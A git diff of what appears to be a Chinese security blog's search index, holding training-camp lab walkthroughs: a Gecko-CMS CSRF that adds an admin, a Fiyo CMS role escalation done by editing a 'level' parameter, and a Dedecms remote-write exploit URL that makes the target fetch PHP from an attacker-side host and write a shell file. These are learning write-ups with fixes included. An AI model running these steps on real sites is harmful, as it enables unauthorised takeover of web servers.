@@ -3535,9 +3535,9 @@ require(),require_once()
         <category>奇技淫巧</category>
       </categories>
       <tags>
+        <tag>渗透</tag>
         <tag>奇技淫巧</tag>
         <tag>内网渗透</tag>
-        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -3584,8 +3584,8 @@ require(),require_once()
         <category>奇技淫巧</category>
       </categories>
       <tags>
-        <tag>奇技淫巧</tag>
         <tag>渗透</tag>
+        <tag>奇技淫巧</tag>
       </tags>
   </entry>
   <entry>
@@ -3635,8 +3635,8 @@ require(),require_once()
         <category>奇技淫巧</category>
       </categories>
       <tags>
-        <tag>奇技淫巧</tag>
         <tag>渗透</tag>
+        <tag>奇技淫巧</tag>
       </tags>
   </entry>
   <entry>
@@ -3674,8 +3674,8 @@ require(),require_once()
         <category>奇技淫巧</category>
       </categories>
       <tags>
-        <tag>奇技淫巧</tag>
         <tag>渗透</tag>
+        <tag>奇技淫巧</tag>
       </tags>
   </entry>
   <entry>
@@ -3771,27 +3771,32 @@ require(),require_once()
       </tags>
   </entry>
   <entry>
-    <title>铁三训练营之CVE-2017-6823 Fiyo CMS权限提升</title>
-    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCVE-2017-6823%20Fiyo%20CMS%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
-    <content><![CDATA[<p>CVE-2017-6823 Fiyo CMS权限提升<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/1.png)</p>
+    <title>铁三训练营之CSRF添加管理员</title>
+    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/</url>
+    <content><![CDATA[<p>CVE-2015-1422 Gecko-CMS CSRF添加管理员</p>
 <a id="more"></a>
 
-<p>1.2访问后台 【<a href="http://192.168.1.3/dapur/】。如图2所示">http://192.168.1.3/dapur/】。如图2所示</a><br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/2.png)</p>
-<p>1.3使用用户【admin】和密码【admin888】登录后台如图3所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/3.png)</p>
-<p>1.4在左边选择Users下的New user,新建一个用户,用户名【xipu】密码【123456】电子邮箱【<a href="mailto:xipu@qq.com">xipu@qq.com</a>】UserGroup选择【Editor】NameLengkap姓名可以随便写。如图4所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/4.png)</p>
-<p>1.5能看到各个组的leve等级。如图5所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/5.png)</p>
-<p>1.6点击右上角的Administrator,点击【Sign Out】退出登录。如图6所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/6.png)</p>
-<p>1.7使用刚创建的账号:Xipu,密码:123456登录。如图7所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/7.png)</p>
-<p>1.8可以看到刚从哪个页面退出的就返回到刚才的页面不用管。可以看到左边的功能变得很少,没有操作用户的功能了。如图8所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/8.png)</p>
-<p>1.9单击右上角的人头选择Edit profile编辑资料。如图9所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/9.png)</p>
-<p>1.10点击 User Group看能否修改成管理员组,发现只能向下修改,并没有管理员的选项。如图10所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/10.png)</p>
-<p>1.11单击“打开菜单”-&gt;“选项”,设置浏览器代理。如图11所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/11.png)</p>
-<p>1.12单击“高级”-&gt;”网络”-&gt;“设置”,打开网络代理设置页面。如图12所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/12.png)</p>
-<p>1.13选择“手动配置代理”,HTTP代理输入“127.00.1”、端口“8080”,单击“确定”按钮。如图13所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/13.png)</p>
-<p>1.14打开burpsuite【C:\tools\Burp1.7.1】,密码填写【123456】然后点击 Simpan,查看提交的数据包,可以看到level的等级也被提交了,前面看到Editon的level等级是3,猜测如果修改成1那么就是Super Administrator权限。如图14所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/14.png)</p>
-<p>1.15把level后的参数修改成1,然后点击Forward按钮放过数据包。如图15所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/15.png)</p>
-<p>1.16点击【Intercept is off】关闭burpsuit的拦截。如图16所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/16.png)</p>
-<p>1.17退出当前账号。然后再重新用【xipu】账户登录,可以发现左边的权限变多了,所属组变成了Super Administrator。如图17所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/17.png)</p>
+<p>托老师的福，竟然有机会报了铁人三项的比赛，赛前有个训练营，刚上去看了看，有漏洞复现的环境给练手，很舒服，不用搭建环境就可以操作，激动的我赶紧练手，然后打算把姿势存下来，加深理解，以防以后忘记。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问【<a href="http://192.168.1.1/admin/】。如图所示">http://192.168.1.1/admin/】。如图所示</a><br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/1.png" class="lazyload"></p>
+<p>输入账号【admin】和密码【admin888】进行登入。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/2.png" class="lazyload"></p>
+<p>点击【admin】，然后再点击【new user】，可以看到添加管理员页面<br>并没有存在验证码，按如下信息进行<br>填写。如图所示<br>1)N ame这里填ZXCV<br>2) Email这里填zxcv@ zxcv.com<br>3) Username这里填ZXCV<br>4) User-group这里选择Administrator<br>5) User Active这里选择Yes<br>6) Password这里填12456<br>7) Confirm Password再次填写密码123456<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/3.png" class="lazyload"></p>
+<p>单击“打开菜单”-&gt;”选项”，设置浏览器代理。如图<br>所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/4.png" class="lazyload"></p>
+<p>单击“高级”-&gt;”网络”-&gt;”设置”，打开网络代理<br>设置页面。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/5.png" class="lazyload"></p>
+<p>选择“手动配置代理”，HTTP代理输入“127.0.0.1” ，端口“8080”，单击“确定”按钮。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/6.png" class="lazyload"></p>
+<p>打开burpsuite在[C.:toos\Burp1.7.1] 然后提交，可以看到输入的信息都以明文的方式发送。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/7.png" class="lazyload"></p>
+<p>右键点击[Send to Repeater] 把3放进repeater模块，看数据包发现并没有Referer验证从哪里提交的数据，也没有tocker验证，点击GO发现返回包是302重定向。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/8.png" class="lazyload"></p>
+<p>关闭burpsuite的代理拦截，点击Users发现zxcv已经添加成功了，并没有出错。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/9.png" class="lazyload"></p>
+<p>这时把用户删了，然后回到上方所示的burpsuite界面，再次单击Go，使用burpsuite发送同样的数据包，发<br>现用户还是创建成功了。于是推测存在csrfi漏洞。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/10.png" class="lazyload"></p>
+<p>右键发送的包选择【Engagement tools】下的【Generate CSRF PoC】生成csrf表单。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/11.png" class="lazyload"></p>
+<p>点击后生成poc,但是其中的符号被转码了，需要手动修改。<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/12.png" class="lazyload"></p>
+<p>新建一个1.html在【C:\phpStudy\wWW】下，用sublime打开，把代码复制进去，然后把编码修改回原来的符号。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/13.png" class="lazyload"></p>
+<p>把用户删掉后，访问【192 168 1.2/1.html】 发现有个提交的按钮。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/14.png" class="lazyload"></p>
+<p>点击按钮后发现跳转到Edit User页面，这和前面抓包返回的302重定向一样。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/15.png" class="lazyload"></p>
+<p>看下users,发现添加成功，说明这个页面的确存在csrf漏洞。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/16.png" class="lazyload"></p>
+<p>但是如何利用呢，不能总是受害者点了才能用，这里可以利用JavaScript实现自动提交表单，受害者只要访问了恶意网页，将自动提交表单，不用点击，可以自己测试下。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/16.png" class="lazyload"></p>
+<p>防御csrf攻击可以添加token,验证码，referer验证从哪里来。这样能有效的阻止csrf漏洞。</p>
+<h2 id="加深理解"><a href="#加深理解" class="headerlink" title="加深理解"></a>加深理解</h2><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。                         –引用百度百科</p>
+<h2 id="自己对他的一点理解"><a href="#自己对他的一点理解" class="headerlink" title="自己对他的一点理解"></a>自己对他的一点理解</h2><p>之前就有接触到这个CSRF漏洞的概念，但是一直做渗透测试的时候没遇到，不过偶然在一次渗透过程中在登录网站后台时候遇到xss攻击，看过百度百科，就初步的认为，和XSS漏洞差不多，XSS漏洞通过站内信任用户，上传恶意代码，管理员点击以后就触发漏洞，CSRF是可以进行跨站攻击的。XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。<br>要完成一次CSRF攻击，受害者必须依次完成以下两个步骤：<br>1：登录受信任网站A，并在本地生成Cookie。<br>2：在不登出A的情况下，访问危险网站B。<br>看到这里，你也许会问：“如果我不满足以上两个条件中的一个，我就不会受到CSRF攻击”。是滴，确实如此，但是你不能保证以下情况不会发生：<br>2.1：你不能保证你登录了一个网站之后，不再打开一个tab页面并访问其它的网站（黄网）。<br>2.2：你不能保证你关闭浏览器之后，你本地的Cookie立刻过期，你上次的会话已经结束。<br>2.3：上述中所谓的攻击网站，可能就是一个钓鱼网站或者黄色网站。</p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -3826,32 +3831,51 @@ require(),require_once()
       </tags>
   </entry>
   <entry>
-    <title>铁三训练营之CSRF添加管理员</title>
-    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/</url>
-    <content><![CDATA[<p>CVE-2015-1422 Gecko-CMS CSRF添加管理员</p>
+    <title>铁三训练营之CVE-2017-6823 Fiyo CMS权限提升</title>
+    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCVE-2017-6823%20Fiyo%20CMS%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
+    <content><![CDATA[<p>CVE-2017-6823 Fiyo CMS权限提升<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/1.png)</p>
 <a id="more"></a>
 
-<p>托老师的福，竟然有机会报了铁人三项的比赛，赛前有个训练营，刚上去看了看，有漏洞复现的环境给练手，很舒服，不用搭建环境就可以操作，激动的我赶紧练手，然后打算把姿势存下来，加深理解，以防以后忘记。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问【<a href="http://192.168.1.1/admin/】。如图所示">http://192.168.1.1/admin/】。如图所示</a><br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/1.png" class="lazyload"></p>
-<p>输入账号【admin】和密码【admin888】进行登入。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/2.png" class="lazyload"></p>
-<p>点击【admin】，然后再点击【new user】，可以看到添加管理员页面<br>并没有存在验证码，按如下信息进行<br>填写。如图所示<br>1)N ame这里填ZXCV<br>2) Email这里填zxcv@ zxcv.com<br>3) Username这里填ZXCV<br>4) User-group这里选择Administrator<br>5) User Active这里选择Yes<br>6) Password这里填12456<br>7) Confirm Password再次填写密码123456<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/3.png" class="lazyload"></p>
-<p>单击“打开菜单”-&gt;”选项”，设置浏览器代理。如图<br>所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/4.png" class="lazyload"></p>
-<p>单击“高级”-&gt;”网络”-&gt;”设置”，打开网络代理<br>设置页面。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/5.png" class="lazyload"></p>
-<p>选择“手动配置代理”，HTTP代理输入“127.0.0.1” ，端口“8080”，单击“确定”按钮。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/6.png" class="lazyload"></p>
-<p>打开burpsuite在[C.:toos\Burp1.7.1] 然后提交，可以看到输入的信息都以明文的方式发送。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/7.png" class="lazyload"></p>
-<p>右键点击[Send to Repeater] 把3放进repeater模块，看数据包发现并没有Referer验证从哪里提交的数据，也没有tocker验证，点击GO发现返回包是302重定向。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/8.png" class="lazyload"></p>
-<p>关闭burpsuite的代理拦截，点击Users发现zxcv已经添加成功了，并没有出错。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/9.png" class="lazyload"></p>
-<p>这时把用户删了，然后回到上方所示的burpsuite界面，再次单击Go，使用burpsuite发送同样的数据包，发<br>现用户还是创建成功了。于是推测存在csrfi漏洞。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/10.png" class="lazyload"></p>
-<p>右键发送的包选择【Engagement tools】下的【Generate CSRF PoC】生成csrf表单。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/11.png" class="lazyload"></p>
-<p>点击后生成poc,但是其中的符号被转码了，需要手动修改。<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/12.png" class="lazyload"></p>
-<p>新建一个1.html在【C:\phpStudy\wWW】下，用sublime打开，把代码复制进去，然后把编码修改回原来的符号。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/13.png" class="lazyload"></p>
-<p>把用户删掉后，访问【192 168 1.2/1.html】 发现有个提交的按钮。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/14.png" class="lazyload"></p>
-<p>点击按钮后发现跳转到Edit User页面，这和前面抓包返回的302重定向一样。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/15.png" class="lazyload"></p>
-<p>看下users,发现添加成功，说明这个页面的确存在csrf漏洞。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/16.png" class="lazyload"></p>
-<p>但是如何利用呢，不能总是受害者点了才能用，这里可以利用JavaScript实现自动提交表单，受害者只要访问了恶意网页，将自动提交表单，不用点击，可以自己测试下。如图所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCSRF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98/16.png" class="lazyload"></p>
-<p>防御csrf攻击可以添加token,验证码，referer验证从哪里来。这样能有效的阻止csrf漏洞。</p>
-<h2 id="加深理解"><a href="#加深理解" class="headerlink" title="加深理解"></a>加深理解</h2><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。                         –引用百度百科</p>
-<h2 id="自己对他的一点理解"><a href="#自己对他的一点理解" class="headerlink" title="自己对他的一点理解"></a>自己对他的一点理解</h2><p>之前就有接触到这个CSRF漏洞的概念，但是一直做渗透测试的时候没遇到，不过偶然在一次渗透过程中在登录网站后台时候遇到xss攻击，看过百度百科，就初步的认为，和XSS漏洞差不多，XSS漏洞通过站内信任用户，上传恶意代码，管理员点击以后就触发漏洞，CSRF是可以进行跨站攻击的。XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。<br>要完成一次CSRF攻击，受害者必须依次完成以下两个步骤：<br>1：登录受信任网站A，并在本地生成Cookie。<br>2：在不登出A的情况下，访问危险网站B。<br>看到这里，你也许会问：“如果我不满足以上两个条件中的一个，我就不会受到CSRF攻击”。是滴，确实如此，但是你不能保证以下情况不会发生：<br>2.1：你不能保证你登录了一个网站之后，不再打开一个tab页面并访问其它的网站（黄网）。<br>2.2：你不能保证你关闭浏览器之后，你本地的Cookie立刻过期，你上次的会话已经结束。<br>2.3：上述中所谓的攻击网站，可能就是一个钓鱼网站或者黄色网站。</p>
+<p>1.2访问后台 【<a href="http://192.168.1.3/dapur/】。如图2所示">http://192.168.1.3/dapur/】。如图2所示</a><br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/2.png)</p>
+<p>1.3使用用户【admin】和密码【admin888】登录后台如图3所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/3.png)</p>
+<p>1.4在左边选择Users下的New user,新建一个用户,用户名【xipu】密码【123456】电子邮箱【<a href="mailto:xipu@qq.com">xipu@qq.com</a>】UserGroup选择【Editor】NameLengkap姓名可以随便写。如图4所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/4.png)</p>
+<p>1.5能看到各个组的leve等级。如图5所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/5.png)</p>
+<p>1.6点击右上角的Administrator,点击【Sign Out】退出登录。如图6所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/6.png)</p>
+<p>1.7使用刚创建的账号:Xipu,密码:123456登录。如图7所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/7.png)</p>
+<p>1.8可以看到刚从哪个页面退出的就返回到刚才的页面不用管。可以看到左边的功能变得很少,没有操作用户的功能了。如图8所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/8.png)</p>
+<p>1.9单击右上角的人头选择Edit profile编辑资料。如图9所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/9.png)</p>
+<p>1.10点击 User Group看能否修改成管理员组,发现只能向下修改,并没有管理员的选项。如图10所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/10.png)</p>
+<p>1.11单击“打开菜单”-&gt;“选项”,设置浏览器代理。如图11所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/11.png)</p>
+<p>1.12单击“高级”-&gt;”网络”-&gt;“设置”,打开网络代理设置页面。如图12所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/12.png)</p>
+<p>1.13选择“手动配置代理”,HTTP代理输入“127.00.1”、端口“8080”,单击“确定”按钮。如图13所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/13.png)</p>
+<p>1.14打开burpsuite【C:\tools\Burp1.7.1】,密码填写【123456】然后点击 Simpan,查看提交的数据包,可以看到level的等级也被提交了,前面看到Editon的level等级是3,猜测如果修改成1那么就是Super Administrator权限。如图14所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/14.png)</p>
+<p>1.15把level后的参数修改成1,然后点击Forward按钮放过数据包。如图15所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/15.png)</p>
+<p>1.16点击【Intercept is off】关闭burpsuit的拦截。如图16所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/16.png)</p>
+<p>1.17退出当前账号。然后再重新用【xipu】账户登录,可以发现左边的权限变多了,所属组变成了Super Administrator。如图17所示<br>![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/17.png)</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>铁三训练营之Dedecms远程写文件</title>
+    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p>CVE-2015-4553 Dedecms远程写文件</p>
+<a id="more"></a>
+
+<p>一个看得半懂不懂的漏洞。存住，等以后学了php以后再加深了解。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在目标机上查看【C: /phpstudy /www/data/admin/config update. php<br>】,已经由原来的内容变为空的内容。如图所示<br><img alt="图1" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/1.png" class="lazyload"><br><img alt="图2" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/2.png" class="lazyload"></p>
+<p>在192.168.1.2打开 phpstudy在【c/ phpstudy/www】下建立【dedecms/ demonata. a. txt】,写入【<?php phpinfo():?>】,也可以是一句话。如图所示<br><img alt="图3" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/3.png" class="lazyload"></p>
+<p>访问【http: //192.168.1. 3/install/index. php?<br>step=11&amp;inslockfile=a&amp;s_lang=a&amp;install_demo_nam<br>e=../data/tchg. php&amp;updatehost=http: //192.168.1<br>2/】,可以看到出现了存在,说明 phpinfo已经写进去<br>了。如图所示<br><img alt="图4" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/4.png" class="lazyload"></p>
+<p>访问 【<a href="http://192.168.1.3/data/tchg.php】,可以看到">http://192.168.1.3/data/tchg.php】,可以看到</a> phpinfo页面说明真的写进去了。如图所示<br><img alt="图5" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/5.png" class="lazyload"></p>
+<p>漏洞产生的原因发生在安装页面【c:/ phpstudy/www/install/index. php】,如果接收到的参数【step=11】,然后包含【C: /phpstudy /www/data/admin/config_update. php】。查看【 config_update.php】里面定义了【updateHost】变量。前面已经把这个文件里的内容绐清空了。这里利用了php5.2的特性,全局变量get可以赋值这样就控制了上传的内容,达到了写shel的目的。如图所示<br><img alt="图6" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/6.png" class="lazyload"></p>
+<p>漏洞修复,升级php版本,或者删除安装文件,或者把php.ini文件中的【register_globals】设置为off</p>
+<h2 id="加深理解"><a href="#加深理解" class="headerlink" title="加深理解"></a>加深理解</h2><p>引用大佬博客。写的很清楚。<br><a href="http://blog.sina.com.cn/s/blog_12f7f19600102wimx.html">http://blog.sina.com.cn/s/blog_12f7f19600102wimx.html</a></p>
